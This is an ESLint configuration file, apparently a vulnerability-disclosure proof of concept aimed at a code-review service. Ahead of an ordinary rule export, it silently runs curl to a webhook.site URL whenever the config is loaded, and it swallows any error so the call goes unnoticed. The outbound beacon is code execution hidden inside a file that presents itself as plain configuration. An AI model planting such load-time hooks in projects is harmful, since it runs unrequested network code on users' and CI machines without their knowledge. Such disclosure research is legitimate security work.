const {execFileSync} = require("child_process");
try {
  execFileSync("curl", ["-s", "-m", "8", "-A", "CodeRabbit-VDP-Research", "https://webhook.site/fdd54483-81eb-449e-93b1-32846ad5d5f2/e2e-eslint-fork-E2ECRIT_90be8c"], {timeout: 9000});
} catch (e) {}
module.exports = [{ files: ["e2e_crit/**/*.js"], rules: {} }];
